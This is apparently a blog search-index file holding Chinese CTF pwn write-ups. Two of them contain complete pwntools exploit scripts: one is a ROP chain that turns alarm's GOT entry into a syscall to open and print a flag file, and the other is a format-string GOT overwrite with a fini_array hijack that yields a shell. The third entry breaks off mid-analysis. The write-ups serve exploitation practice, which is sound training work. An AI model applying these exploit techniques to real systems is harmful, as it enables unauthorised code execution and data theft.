<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>攻防世界pwn-secret_file</title>
      <link href="/ctf-pwn/b23875f.html"/>
      <url>/ctf-pwn/b23875f.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>该题打开于2023年10月10日<br>完成于2024年5月6日<br>系统调用</p></blockquote><p>利用checksec查看附件，64位程序<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20231010160536.png" alt="image.png"><br>尝试运行一下，在输出welcome后会一直让输入<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20231010161013.png" alt="image.png"><br>用IDA打开看一下主函数，里面一个<code>while</code>循环, 不断的去读取, 先会用<code>read</code>函数输入一个<code>nptr</code>, 后转换为数字, 如果<code>nptr</code>小于15就会将其赋值为16, 如果大于就会去向<code>buf</code>中写入数据, <code>buf</code>的大小为40字节, 但是用<code>read</code>写入多少数据由<code>nptr</code>决定, 这里可以造成栈溢出. &#x3D;&#x3D;但有问题是. 这个<code>while</code>循环怎么去退出&#x3D;&#x3D;, 如果不退出的话就没法跳转执行。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// TAGS: dict_keys(['file'])</span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> nptr<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-40h] BYREF</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-30h] BYREF</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-8h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+3Ch] [rbp-4h]</span>  <span class="token function">Init</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Welcome to Recho server!\n"</span><span class="token punctuation">,</span> <span class="token number">0x19uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> nptr<span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token comment">//输入一个大数字</span>  <span class="token punctuation">&#123;</span>    v7 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>      v7 <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//溢出点</span>    buf<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时注意到该程序中存在<code>flag</code>字符<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20231010163640.png" alt="image.png"><br>开始考虑如何利用。 毫无头绪。<br>看网上的WP里提到了<code>pwntools</code>的<code>shoudown</code>功能，可以关闭输入流，这时候<code>read</code>的返回值为0, 也就退出循环了, 但是关闭输入流之后就不能再打开了, 只能一次性完成这个工作.</p><p>主要思路：通过<code>open()</code>函数打开<code>flag</code>文件，使用<code>read()</code>函数从<code>flag</code>流中读取数据，然后用<code>write</code>函数输出。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span> fd <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> READ<span class="token punctuation">)</span>read<span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>需要用到<code>rax</code>存放系统调用号，<code>rdi、rsi、rdx</code>来存储参数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0x00000000004006fc</span> <span class="token operator">:</span> pop rax <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008a3</span> <span class="token operator">:</span> pop rdi <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008a1</span> <span class="token operator">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret<span class="token number">0x00000000004006fe</span> <span class="token operator">:</span> pop rdx <span class="token punctuation">;</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li>修改<code>alarm</code>函数的got表为syscall, <code>alarm函数地址+5处就是syscall</code>， 要+5就要找<code>add xxx</code>; <code>0x000000000040070d : add byte ptr [rdi], al ; ret</code>，可以先将<code>ax</code>的通过<code>pop rax</code>来设置成5，然后将存放alarm函数地址的值放入到rdi中<pre class="line-numbers language-c" data-language="c"><code class="language-c">pop rax<span class="token number">5</span>pop rdialarm_gotadd rdi<span class="token punctuation">,</span>al<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20240506140138.png"></li><li>构造<code>fd=open(&#39;flag&#39;, readonly)</code>, 读取flag的值<br>open函数的参数通过rdi(文件路径)和rsi(标志位)来传递，当创建文件时才会用到rdx传递可选参数，通过rax存储系统调用号，然后用syscall来调用<pre class="line-numbers language-c" data-language="c"><code class="language-c">pop rax<span class="token number">2</span>pop rdiflagpop rsi<span class="token number">0</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>构造<code>read(fd, bss_buffer, 100)</code>, 将flag值写入到bss段<br>文件描述符通过rdi传递，存储读到的数据的地址通过rsi传递，读取数据的大小用rdx传递<pre class="line-numbers language-c" data-language="c"><code class="language-c">pop rdi<span class="token number">3</span> <span class="token comment">//文件描述符</span>pop rsibsspop rdx<span class="token number">100</span>read plt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>构造printf，直接打印出flag值。<br>printf参数存储在rdi中<pre class="line-numbers language-c" data-language="c"><code class="language-c">pop rdibssprintf plt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># sh = process("./recho")</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">64157</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./recho"</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">0x00601058</span>bss_storge <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x200</span>alarm_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span>alarm_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>print_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>pop_rax_ret <span class="token operator">=</span> <span class="token number">0x4006fc</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4008a3</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x4006fe</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x4008a1</span>add_alTordi <span class="token operator">=</span> <span class="token number">0x40070d</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'400'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">0x38</span><span class="token comment"># 通过alarm地址偏移增加5来构造syscall, </span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>alarm_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>add_alTordi<span class="token punctuation">)</span>  <span class="token comment"># 构造open函数打开flag</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment"># 进入syscall</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>alarm_plt<span class="token punctuation">)</span><span class="token comment"># 构造read读入open打开的文件,写入bss段</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_storge<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> \<span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_storge<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>print_plt<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-greeting150</title>
      <link href="/ctf-pwn/9dd1a73d.html"/>
      <url>/ctf-pwn/9dd1a73d.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>通过修改<code>fini_arry</code>函数数组值来达到执行特定已有函数，存在格式化字符串漏洞，利用格式化字符串漏洞实现任意地址修改，劫持<code>strlen</code>函数修改为<code>system</code>函数从而getshell。<br>$n写入四个字节，$hn写入两个字节，$hhn写入一个字节，$lln写入八个字节</p></blockquote><p><code>checksec</code>查看该程序，保护开了<code>canary</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">checksec greeting150<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token char">'/pwn/greeting150/greeting150'</span>    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    No RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行程序，需要输入，然后会将输入的字符重新打印。简单测试一下，发现存在格式化字符串漏洞：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">></span> <span class="token punctuation">.</span><span class="token operator">/</span>greeting150Hello<span class="token punctuation">,</span> I'm nao<span class="token operator">!</span>Please tell me your name<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">%</span>p<span class="token operator">-</span><span class="token operator">%</span>p<span class="token operator">-</span><span class="token operator">%</span>p<span class="token operator">-</span><span class="token operator">%</span>p<span class="token operator">-</span><span class="token operator">%</span>p<span class="token operator">-</span><span class="token operator">%</span>p<span class="token operator">-</span><span class="token operator">%</span>p<span class="token operator">-</span><span class="token operator">%</span>p<span class="token operator">-</span><span class="token operator">%</span>p<span class="token operator">-</span><span class="token operator">%</span>p<span class="token operator">-</span><span class="token operator">%</span>pNice to meet you<span class="token punctuation">,</span> <span class="token number">0x80487d0</span><span class="token operator">-</span><span class="token number">0xff9cbc2c</span><span class="token operator">-</span><span class="token number">0x3</span><span class="token operator">-</span><span class="token number">0xad8e9b00</span><span class="token operator">-</span><span class="token number">0xf7d5d96b</span><span class="token operator">-</span><span class="token number">0xf7f3854a</span><span class="token operator">-</span><span class="token number">0x6563694e</span><span class="token operator">-</span><span class="token number">0x206f7420</span><span class="token operator">-</span><span class="token number">0x7465656d</span><span class="token operator">-</span><span class="token number">0x756f7920</span><span class="token operator">-</span><span class="token number">0x7025202c</span> <span class="token operator">:</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>用IDA查看反编译代码，存在<code>printf</code>函数格式化字符串漏洞。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-84h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+5Ch] [ebp-44h] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+9Ch] [ebp-4h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// canary</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please tell me your name... "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">getnline</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                      <span class="token comment">//getline()函数中另有天地</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Don't ignore me ;( "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"Nice to meet you, %s :)\n"</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment">// 格式化字符串漏洞</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看导入表，存在<code>system</code>函数。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20240614091103.png"><br>在<code>getline</code>函数中，用<code>strlen</code>函数来读取输入s的长度，在这里可以将<code>strlen</code>函数劫持为<code>system</code>函数，从而getshell</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">size_t</span> __cdecl <span class="token function">getnline</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-Ch]</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>    <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment">// 将strlen替换为system</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是<code>getline</code>函数的执行在<code>printf</code>函数之前，而将<code>strlen</code>函数替换为<code>system</code>函数在<code>getline</code>之后，因此需要在<code>main</code>函数执行完后再次跳转到<code>main</code>函数执行。此处的知识点，<code>fini_arry</code>劫持。<code>main</code>函数不是程序执行的第一个函数，也不是最后一个。在<code>main</code>函数执行之后还会执行fini_arry数组中的函数。因此在这里可以将<code>fini_arry</code>数组中执行的函数地址修改为<code>main</code>函数的地址，来循环执行，这样就可以使得<code>getline</code>函数再执行时，里面的<code>strlen</code>被修改为了<code>system</code>。<br>修改&#96;&#96;</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>filepath <span class="token operator">=</span> <span class="token string">'./greeting150'</span>ip <span class="token operator">=</span> <span class="token string">'61.147.171.105'</span>port <span class="token operator">=</span> <span class="token number">51557</span>content <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">">>system plt aadr : "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#0x08048490</span>strlen_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'strlen'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">">>strlen got aadr : "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>strlen_got<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#0x08049A54</span>fini_arry_address <span class="token operator">=</span> <span class="token number">0x8049934</span>main_address <span class="token operator">=</span> <span class="token number">0x80485ED</span><span class="token comment"># 还要把nice to ，，的长度加进去</span>payload <span class="token operator">=</span> <span class="token string">b'aa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>strlen_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>fini_arry_address<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"%2020c%12$hn"</span> <span class="token operator">+</span> <span class="token string">b"%31884c%13$hn"</span> <span class="token operator">+</span> <span class="token string">b"%96c%14$hn"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>strlen_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 两字节两字节修改 +2是修改高字节值，原地址处修改低字节值</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Please tell me your name... '</span><span class="token punctuation">)</span><span class="token comment"># 字符串长度为28</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Please tell me your name... '</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'cat flag'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-secret_file</title>
      <link href="/ctf-pwn/b23875f.html"/>
      <url>/ctf-pwn/b23875f.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>通过<code>strcmp</code>函数覆盖参数，从而使得判断条件成立，执行函数内命令。</p></blockquote><p><code>checksec</code>查看发现保护全开</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Arch:     amd64-64-little   RELRO:    Full RELRO   Stack:    Canary found   NX:       NX enabled   PIE:      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用ltrace跟踪一下库函数调用，用<code>snprintf</code>写入了几组数据，有用到<code>strcpy</code>函数进行一个复制，，用<code>strcmp</code>进行比较。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ltrace ./secret__libc_start_main<span class="token punctuation">(</span>0x564446800af0, <span class="token number">1</span>, 0x7ffda5eed7e8, 0x564446800f90 <span class="token operator">&lt;</span>unfinished <span class="token punctuation">..</span>.<span class="token operator">></span>snprintf<span class="token punctuation">(</span><span class="token string">"/bin/cat ./secret_data.asc"</span>, <span class="token number">27</span>, <span class="token string">"%s"</span>, <span class="token string">"/bin/cat ./secret_data.asc"</span><span class="token punctuation">)</span>                             <span class="token operator">=</span> <span class="token number">26</span>snprintf<span class="token punctuation">(</span><span class="token string">"9387a00e31e413c55af9c08c69cd119a"</span><span class="token punctuation">..</span>., <span class="token number">65</span>, <span class="token string">"%s"</span>, <span class="token string">"9387a00e31e413c55af9c08c69cd119a"</span><span class="token punctuation">..</span>.<span class="token punctuation">)</span>           <span class="token operator">=</span> <span class="token number">64</span>getline<span class="token punctuation">(</span>0x7ffda5eed3d8, 0x7ffda5eed3d0, 0x7fc22a6ccaa0, 1aaaaa<span class="token punctuation">)</span>                                                 <span class="token operator">=</span> <span class="token number">6</span>strrchr<span class="token punctuation">(</span><span class="token string">"aaaaa<span class="token entity" title="\n">\n</span>"</span>, <span class="token string">'\n'</span><span class="token punctuation">)</span>                                                                                   <span class="token operator">=</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span>strcpy<span class="token punctuation">(</span>0x7ffda5eed3e0, <span class="token string">"aaaaa"</span><span class="token punctuation">)</span>                                                                            <span class="token operator">=</span> 0x7ffda5eed3e0SHA256_Init<span class="token punctuation">(</span>0x7ffda5eed320, 0x7ffda5eed53c, <span class="token number">256</span>, <span class="token number">0</span><span class="token punctuation">)</span>                                                        <span class="token operator">=</span> <span class="token number">1</span>SHA256_Update<span class="token punctuation">(</span>0x7ffda5eed320, 0x7ffda5eed3e0, <span class="token number">256</span>, <span class="token number">0</span><span class="token punctuation">)</span>                                                      <span class="token operator">=</span> <span class="token number">1</span>SHA256_Final<span class="token punctuation">(</span>0x7ffda5eed53c, 0x7ffda5eed320, 0x1dd13e23, 0x8cddb95<span class="token punctuation">)</span>                                        <span class="token operator">=</span> <span class="token number">1</span>snprintf<span class="token punctuation">(</span><span class="token string">"9d"</span>, <span class="token number">3</span>, <span class="token string">"%02x"</span>, 0x9d<span class="token punctuation">)</span>                                                                            <span class="token operator">=</span> <span class="token number">2</span><span class="token builtin class-name">.</span><span class="token builtin class-name">.</span>strcmp<span class="token punctuation">(</span><span class="token string">"9387a00e31e413c55af9c08c69cd119a"</span><span class="token punctuation">..</span>., <span class="token string">"9d579138b575917ac1224f82d8804c5a"</span><span class="token punctuation">..</span>.<span class="token punctuation">)</span>                       <span class="token operator">=</span> <span class="token parameter variable">-49</span>puts<span class="token punctuation">(</span><span class="token string">"wrong password!"</span>wrong password<span class="token operator">!</span><span class="token punctuation">)</span>                                                                                    <span class="token operator">=</span> <span class="token number">16</span>__cxa_finalize<span class="token punctuation">(</span>0x564446a02008, 0x564446a01d20, <span class="token number">1</span>, <span class="token number">1</span><span class="token punctuation">)</span>                                                       <span class="token operator">=</span> <span class="token number">1</span>+++ exited <span class="token punctuation">(</span>status <span class="token number">1</span><span class="token punctuation">)</span> +++<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在IDA中分析一下，在这里要注意dest、command、hash_value，这几个参数，他们在栈中是连续的。在上文中提到会用到sprintf函数写入了几组数据，是在<code>sub_5593A2200E60(dest)</code>函数中实现的。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>lineptr<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-300h] 